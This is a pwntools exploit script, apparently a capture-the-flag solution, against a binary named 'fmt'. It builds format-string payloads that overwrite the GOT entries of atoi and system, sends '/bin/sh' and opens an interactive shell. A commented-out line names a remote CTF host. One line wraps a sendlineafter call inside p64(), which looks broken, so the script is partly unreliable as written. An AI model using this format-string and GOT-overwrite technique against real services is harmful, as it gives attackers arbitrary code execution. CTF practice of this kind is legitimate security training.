from pwn import *
from libformatstr import FormatStr


binary = './fmt'
p = process(binary)
# p = remote('localhost', 5002)
#p = remote('pwn.byteband.it', 6969)
elf = ELF(binary)

context.arch = "amd64"

s = '''
init-pwndbg
b *0x4012d5
'''

# gdb.attach(p, s)

p.sendlineafter('Choice: ', '2')
fmt = fmtstr_payload(6, {elf.got['atoi']: 0x401056})
fmt2 = fmtstr_payload(6, {elf.got['system'] :0x004011f7})


ret = 0x000000000040101a
# p.sendline('AAAABBBB' + '.%p' * 10)
pause()
p.sendlineafter("gift.\n", fmt2 + p64(p.sendlineafter("gift.\n", fmt2)))

p.sendlineafter('Choice: ', '2')
p.sendlineafter("gift.\n", fmt)
p.sendlineafter('Choice:', '/bin/sh')

p.interactive()